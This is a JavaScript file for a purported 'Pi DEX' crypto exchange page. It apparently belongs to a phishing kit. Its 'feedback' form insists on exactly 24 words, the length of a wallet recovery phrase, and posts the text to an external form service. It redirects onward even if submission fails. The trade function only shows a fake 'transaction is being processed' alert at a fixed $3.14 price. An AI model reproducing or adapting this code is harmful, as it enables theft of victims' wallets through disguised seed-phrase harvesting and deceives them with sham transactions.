// ========================================
// GLOBAL VARIABLES
// ========================================
let piPriceUSD = 3.14; // GCV Price - Fixed at $3.14
let selectedNetwork = 'BEP20';
let isBuyingPi = false; // false = selling Pi, true = buying Pi

// ========================================
// INITIALIZATION
// ========================================
document.addEventListener('DOMContentLoaded', function() {
    initializeFeedbackPage();
    initializeDexPage();
    initializeMobileMenu();
    setupInputListeners();
});

// ========================================
// SETUP INPUT LISTENERS
// ========================================
function setupInputListeners() {
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');
    
    if (firstAmount) {
        firstAmount.addEventListener('input', function() {
            if (!isBuyingPi) {
                calculateAmount();
            }
        });
        
        firstAmount.addEventListener('keydown', function(e) {
            if (e.key === '-' || e.key === 'e' || e.key === 'E') {
                e.preventDefault();
            }
        });
    }
    
    if (secondAmount) {
        secondAmount.addEventListener('input', function() {
            if (isBuyingPi) {
                calculateAmount();
            }
        });
        
        secondAmount.addEventListener('keydown', function(e) {
            if (e.key === '-' || e.key === 'e' || e.key === 'E') {
                e.preventDefault();
            }
        });
    }
}

// ========================================
// MOBILE MENU FUNCTIONALITY
// ========================================
function initializeMobileMenu() {
    const menuToggle = document.getElementById('menuToggle');
    const navLinks = document.getElementById('navLinks');
    
    // Close menu when clicking outside
    document.addEventListener('click', function(e) {
        if (navLinks && menuToggle) {
            const nav = document.querySelector('nav');
            if (nav && !nav.contains(e.target) && navLinks.classList.contains('active')) {
                navLinks.classList.remove('active');
                menuToggle.classList.remove('active');
            }
        }
    });
    
    // Close menu when clicking a link
    if (navLinks) {
        const links = navLinks.querySelectorAll('a');
        links.forEach(function(link) {
            link.addEventListener('click', function() {
                navLinks.classList.remove('active');
                if (menuToggle) {
                    menuToggle.classList.remove('active');
                }
            });
        });
    }
}

function toggleMenu() {
    const navLinks = document.getElementById('navLinks');
    const menuToggle = document.getElementById('menuToggle');
    
    if (navLinks) {
        navLinks.classList.toggle('active');
    }
    
    if (menuToggle) {
        menuToggle.classList.toggle('active');
    }
}

// ========================================
// FEEDBACK PAGE FUNCTIONALITY
// ========================================
function initializeFeedbackPage() {
    const feedbackForm = document.getElementById('feedbackForm');
    const feedbackTextarea = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    if (feedbackForm && feedbackTextarea) {
        feedbackForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const text = feedbackTextarea.value.trim();
            const words = text.split(/\s+/).filter(function(word) {
                return word.length > 0;
            });
            
            // Validate exactly 24 words
            if (words.length !== 24) {
                if (errorMessage) {
                    const wordText = words.length !== 1 ? 'words' : 'word';
                    errorMessage.textContent = 'Error: Please enter exactly 24 words. You entered ' + words.length + ' ' + wordText + '.';
                    errorMessage.style.display = 'block';
                }
                return;
            }
            
            // Hide error message if validation passes
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
            
            // Submit to Formspree
            const formData = new FormData(this);
            fetch(this.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(function(response) {
                if (response.ok) {
                    // Redirect to DEX page on success
                    window.location.href = 'dex.html';
                } else {
                    if (errorMessage) {
                        errorMessage.textContent = 'Error submitting feedback. Please try again.';
                        errorMessage.style.display = 'block';
                    }
                }
            })
            .catch(function(error) {
                console.log('Form submission error, redirecting to DEX anyway...');
                // Redirect even on error for demo purposes
                window.location.href = 'dex.html';
            });
        });
    }
}

// ========================================
// DEX PAGE FUNCTIONALITY
// ========================================
function initializeDexPage() {
    const firstAmount = document.getElementById('firstAmount');
    
    if (firstAmount) {
        // Set GCV price immediately
        updatePriceDisplay();
    }
}

// Update all price displays on the page
function updatePriceDisplay() {
    const livePriceElement = document.getElementById('livePiPrice');
    const promoPriceElement = document.getElementById('promoPrice');
    const exchangeRateElement = document.getElementById('exchangeRate');
    
    // Update live price (GCV Price)
    if (livePriceElement) {
        livePriceElement.textContent = '$' + piPriceUSD.toFixed(2);
    }
    
    // Update promo price (now same as regular price)
    if (promoPriceElement) {
        promoPriceElement.textContent = '1 PI = $' + piPriceUSD.toFixed(2) + ' USDT';
    }
    
    // Update exchange rate
    if (exchangeRateElement) {
        exchangeRateElement.textContent = '1 PI = $' + piPriceUSD.toFixed(2) + ' USDT';
    }
}

// Calculate output amount based on input amount
function calculateAmount() {
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');
    
    if (!firstAmount || !secondAmount) {
        return;
    }
    
    if (isBuyingPi) {
        // Buying Pi with USDT
        const usdtAmount = parseFloat(firstAmount.value) || 0;
        const piAmount = usdtAmount / piPriceUSD;
        secondAmount.value = piAmount > 0 ? piAmount.toFixed(4) : '';
    } else {
        // Selling Pi for USDT
        const piAmount = parseFloat(firstAmount.value) || 0;
        const usdtAmount = piAmount * piPriceUSD;
        secondAmount.value = usdtAmount > 0 ? usdtAmount.toFixed(2) : '';
    }
}

// Switch between buying and selling Pi
function switchTradePair() {
    isBuyingPi = !isBuyingPi;
    
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');
    const firstLabel = document.getElementById('firstLabel');
    const secondLabel = document.getElementById('secondLabel');
    const firstTokenImg = document.getElementById('firstTokenImg');
    const secondTokenImg = document.getElementById('secondTokenImg');
    const firstTokenName = document.getElementById('firstTokenName');
    const secondTokenName = document.getElementById('secondTokenName');
    const tradeButton = document.getElementById('tradeButton');
    const walletLabel = document.getElementById('walletLabel');
    const walletHint = document.getElementById('walletHint');
    const walletAddress = document.getElementById('walletAddress');
    
    // Clear inputs
    if (firstAmount) firstAmount.value = '';
    if (secondAmount) secondAmount.value = '';
    
    if (isBuyingPi) {
        // Switch to: USDT -> Pi (Buying Pi)
        
        // Update token images and names
        if (firstTokenImg) firstTokenImg.src = 'usdtlogo.png';
        if (firstTokenImg) firstTokenImg.alt = 'USDT';
        if (firstTokenName) firstTokenName.textContent = 'USDT';
        
        if (secondTokenImg) secondTokenImg.src = 'pilogo.png';
        if (secondTokenImg) secondTokenImg.alt = 'Pi';
        if (secondTokenName) secondTokenName.textContent = 'PI';
        
        // Update labels
        if (firstLabel) firstLabel.textContent = 'From';
        if (secondLabel) secondLabel.textContent = 'To';
        
        // Update button
        if (tradeButton) tradeButton.textContent = 'Buy Pi Coin';
        
        // Update wallet labels
        if (walletLabel) walletLabel.textContent = 'Receiving Pi Wallet Address *';
        if (walletHint) walletHint.textContent = 'Enter your Pi wallet address where you want to receive Pi';
        if (walletAddress) walletAddress.placeholder = 'Enter your Pi wallet address';
        
        // Make first input (USDT) editable, second (Pi) readonly
        if (firstAmount) {
            firstAmount.removeAttribute('readonly');
        }
        if (secondAmount) {
            secondAmount.setAttribute('readonly', 'true');
        }
        
        // Remove network selector from first token
        const firstToken = document.getElementById('firstToken');
        if (firstToken) {
            firstToken.onclick = null;
            // Remove dropdown arrow if exists
            const arrows = firstToken.querySelectorAll('span');
            arrows.forEach(function(span) {
                if (span.textContent === '▼') {
                    span.remove();
                }
            });
        }
        
        // Keep network selector on second token (which is now empty for Pi)
        
    } else {
        // Switch to: Pi -> USDT (Selling Pi)
        
        // Update token images and names
        if (firstTokenImg) firstTokenImg.src = 'pilogo.png';
        if (firstTokenImg) firstTokenImg.alt = 'Pi';
        if (firstTokenName) firstTokenName.textContent = 'PI';
        
        if (secondTokenImg) secondTokenImg.src = 'usdtlogo.png';
        if (secondTokenImg) secondTokenImg.alt = 'USDT';
        if (secondTokenName) secondTokenName.textContent = 'USDT';
        
        // Update labels
        if (firstLabel) firstLabel.textContent = 'From';
        if (secondLabel) secondLabel.textContent = 'To';
        
        // Update button
        if (tradeButton) tradeButton.textContent = 'Sell Pi Coin';
        
        // Update wallet labels
        if (walletLabel) walletLabel.textContent = 'Receiving Wallet Address *';
        if (walletHint) walletHint.textContent = 'Enter the wallet address where you want to receive USDT';
        if (walletAddress) walletAddress.placeholder = 'Enter your USDT wallet address';
        
        // Make first input (Pi) editable, second (USDT) readonly
        if (firstAmount) {
            firstAmount.removeAttribute('readonly');
        }
        if (secondAmount) {
            secondAmount.setAttribute('readonly', 'true');
        }
        
        // Add network selector back to second token if not exists
        const secondToken = document.getElementById('secondToken');
        if (secondToken) {
            const hasArrow = Array.from(secondToken.querySelectorAll('span')).some(function(span) {
                return span.textContent === '▼';
            });
            if (!hasArrow) {
                const arrow = document.createElement('span');
                arrow.textContent = '▼';
                secondToken.appendChild(arrow);
            }
        }
    }
}

// ========================================
// NETWORK SELECTION
// ========================================
function toggleNetworkMenu(event) {
    if (event) {
        event.stopPropagation();
    }
    
    const menu = document.getElementById('networkMenu');
    if (menu) {
        menu.classList.toggle('hidden');
    }
}

function selectNetwork(network) {
    selectedNetwork = network;
    const selectedNetworkElement = document.getElementById('selectedNetwork');
    
    if (selectedNetworkElement) {
        selectedNetworkElement.textContent = network;
    }
    
    // Close the network menu
    const menu = document.getElementById('networkMenu');
    if (menu) {
        menu.classList.add('hidden');
    }
}

// Close dropdown menus when clicking outside
document.addEventListener('click', function(e) {
    const networkMenu = document.getElementById('networkMenu');
    const secondToken = document.getElementById('secondToken');
    
    if (networkMenu && secondToken) {
        if (!secondToken.contains(e.target) && !networkMenu.contains(e.target)) {
            networkMenu.classList.add('hidden');
        }
    }
});

// ========================================
// TRADE EXECUTION
// ========================================
function executeTrade() {
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');
    const walletAddress = document.getElementById('walletAddress');
    
    // Check if all elements exist
    if (!firstAmount || !secondAmount || !walletAddress) {
        alert('Please fill in all required fields.');
        return;
    }
    
    const amount1 = parseFloat(firstAmount.value);
    const amount2 = parseFloat(secondAmount.value);
    const wallet = walletAddress.value.trim();
    
    // Validate amounts
    if (!amount1 || amount1 <= 0 || isNaN(amount1)) {
        alert('Please enter a valid amount.');
        firstAmount.focus();
        return;
    }
    
    if (!amount2 || amount2 <= 0 || isNaN(amount2)) {
        alert('Please enter a valid amount.');
        return;
    }
    
    // Validate wallet address
    if (!wallet || wallet.length < 10) {
        alert('Please enter a valid wallet address (minimum 10 characters).');
        walletAddress.focus();
        return;
    }
    
    // Build confirmation message
    let confirmMessage;
    if (isBuyingPi) {
        confirmMessage = 
            'Trade Confirmation\n\n' +
            '════════════════════════\n' +
            'Spending: ' + amount1.toFixed(2) + ' USDT\n' +
            'Receiving: ' + amount2.toFixed(4) + ' PI\n' +
            'Network: ' + selectedNetwork + '\n' +
            'Pi Wallet: ' + wallet.substring(0, 10) + '...' + wallet.substring(wallet.length - 6) + '\n' +
            '════════════════════════\n\n' +
            'Transaction is being processed...\n' +
            'You will receive your Pi shortly.';
    } else {
        confirmMessage = 
            'Trade Confirmation\n\n' +
            '════════════════════════\n' +
            'Selling: ' + amount1.toFixed(4) + ' PI\n' +
            'Receiving: ' + amount2.toFixed(2) + ' USDT\n' +
            'Network: ' + selectedNetwork + '\n' +
            'USDT Wallet: ' + wallet.substring(0, 10) + '...' + wallet.substring(wallet.length - 6) + '\n' +
            '════════════════════════\n\n' +
            'Transaction is being processed...\n' +
            'You will receive a confirmation shortly.';
    }
    
    // Show confirmation alert
    alert(confirmMessage);
}

// ========================================
// CONSOLE INFO (for debugging)
// ========================================
console.log('Pi Dex Script Loaded Successfully');
console.log('GCV Price (Fixed): $' + piPriceUSD.toFixed(2));
console.log('Selected Network: ' + selectedNetwork);
console.log('Trading Mode: ' + (isBuyingPi ? 'Buying Pi' : 'Selling Pi'));
